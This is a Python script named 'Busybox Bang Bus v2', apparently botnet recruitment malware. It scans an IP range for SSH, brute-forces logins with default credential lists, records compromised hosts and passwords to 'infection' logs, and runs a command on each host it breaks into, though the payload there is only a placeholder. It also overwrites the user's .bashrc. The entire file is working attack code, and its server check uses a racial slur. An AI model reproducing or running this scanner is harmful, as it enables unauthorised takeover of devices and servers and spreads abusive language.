#!/usr/bin/env python
"""
						Busybox Bang Bus v2
			LiGhT dA BoSs yA DiG! nO CoDe RiPPrInG PlZ
XORA IS A SKID, PROXY IS A SKID, ZONE IS A SKID, YOU ARE ALL SKIDZ!
"""

import threading, paramiko, random, socket, time, os, sys

if not os.geteuid()==0:
	sys.exit("\nGOTTA BE ROOT TO RIDE DA BANG BUS YA DIG\n")

os.system("clear")
if len(sys.argv) < 3:
	print "BuSyBoX BaNG BuS v2"
	print "Usage: python "+sys.argv[0]+" [Start IP] [End IP] [0/1/2/perl/ubnt]"
	sys.exit("Example: python "+sys.argv[0]+" 1.1.1.1 2.2.2.2 0\n")

sys.stdout.write("\x1b]2;BuSyBoX BaNG BuS\x07")
os.system("clear")
os.system("echo -e 'ulimit -s 999999; ulimit -n 999999; ulimit -u 999999\n' > ~/.bashrc")
os.system("ulimit -s 999999; ulimit -n 999999; ulimit -u 999999")
paramiko.util.log_to_file("/dev/null") #quiets paramiko output
os.system("sysctl -w fs.file-max=999999 >/dev/null")

passwords = [ # argv 0
    "ubnt:ubnt",
    "root:root",
    "root:admin",
    "admin:admin",
    "root:1234",
    "admin:1234",
    "guest:guest",
    "user:user",
    "test:test",
]

if sys.argv[3] == '1':
	passwords = [ "root:root", "root:admin", "admin:admin", "ubnt:ubnt", "root:1234", "admin:1234", "guest:guest", "user:user", "test:test" ] #Slow but effective
if sys.argv[3] == '2':
	passwords = [ "root:root", "admin:admin", "ubnt:ubnt" ] #faster with decent execution
if sys.argv[3] == 'perl':
	passwords = [ "pi:raspberry", "vagrant:vagrant" ] #perl scanner
if sys.argv[3] == 'ubnt':
	passwords = [ "ubnt:ubnt" ] #only ubnt

raw_input("Press <ENTER> to Enter the Bang Bus")
credit = '# DO NOT SHARE THIS FUCKING SHIT' #throwback lulz
print "\033[0m" + credit + "\033[0m"

def ipRange(start_ip, end_ip):
	start = list(map(int, start_ip.split(".")))
	end = list(map(int, end_ip.split(".")))
	temp = start
	ip_range = []

	ip_range.append(start_ip)
	while temp != end:
		start[3] += 1
		for i in (3, 2, 1):
			if temp[i] == 256:
				temp[i] = 0
				temp[i-1] += 1
		ip_range.append(".".join(map(str, temp)))    

	return ip_range
class sshscanner(threading.Thread): # TAG: 1A
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip)
	global passwords
	def run(self):
		x = 1
		while x != 0:
			try:
				username='root'
				password="0"
				port = 22
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(3)
				s.connect((self.ip, port))
				s.close()
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				dobreak=False
				for passwd in passwords:
					if ":n/a" in passwd:
						password=""
					else:
						password=passwd.split(":")[1]
					if "n/a:" in passwd:
						username=""
					else:
						username=passwd.split(":")[0]
					try:
						ssh.connect(self.ip, port = port, username=username, password=password, timeout=5)
						dobreak=True
						break
					except:
						pass
					if True == dobreak:
						break
				badserver=True
				stdin, stdout, stderr = ssh.exec_command("echo nigger")
				output = stdout.read()
				if "nigger" in output:
					badserver=False	
				if badserver == False:
					os.system("echo -e " +self.ip+ " >> .infected.ips")
					os.system("echo -e " +username+ ":" +password+ ":" +self.ip+ " >> infection.log")
					print "\033[32mBuSyBoXiNG -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m"
					ssh.exec_command("command here")
					time.sleep(3)
					ssh.close()
				if badserver == True:
					ssh.close()
			except:
				pass
			x = 0
ip_range = ipRange("" +sys.argv[1], "" +sys.argv[2])
for ip in ip_range:
	try:				
		t = sshscanner(ip)
		t.start()
	except:
		pass # LiGhT yA DiG